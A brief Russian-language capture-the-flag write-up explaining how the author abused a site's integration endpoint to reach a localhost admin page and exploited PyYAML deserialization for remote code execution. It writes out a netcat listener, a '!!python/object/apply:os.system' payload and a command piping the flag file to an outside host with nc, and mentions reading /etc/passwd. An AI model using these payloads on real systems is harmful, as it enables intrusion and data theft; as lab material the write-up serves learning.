1. Смотрим, какие проверки делает сайт и направляем его на наш сервер http://b121.ctf2019.rocks/integration/89.163.129.121:9999. 
Видим, что он отправляет  {"key": "test_key", "value": "test_value"} и проверяет value. Запускаем  
```
value while true; do echo -e "HTTP/1.1 200 OK\n\n  test_value" | nc -l -v -p 9999 -q 1;done
```
на 89.163.129.121 и получаем 1-й флаг.

2. Видим, что запросы через http://b121.ctf2019.rocks/integration/ на закрытый порт падают с ошибкой из  urllib3 
питона.

3. Находим адимнку. Проверям как сайт реагирует на параметры в  http://localhost/admin/?blacklist= . Видим, что он падает с 500
ошибкой про несбалансированных кавычках. Поиск по python remote code execution привел к уязвимости в  pyyaml. 
Передаем http://localhost/admin/?blacklist=!!python/object/apply:os.system ["sleep 5"] и подтверждаем уязвимость. 
Достаем флаг в http://localhost/admin/?blacklist=!!python/object/apply:os.system [" cat flag | nc 89.163.129.121:9999"]
Находим дополнительные флаги в ./integration.db  и /etc/passwd
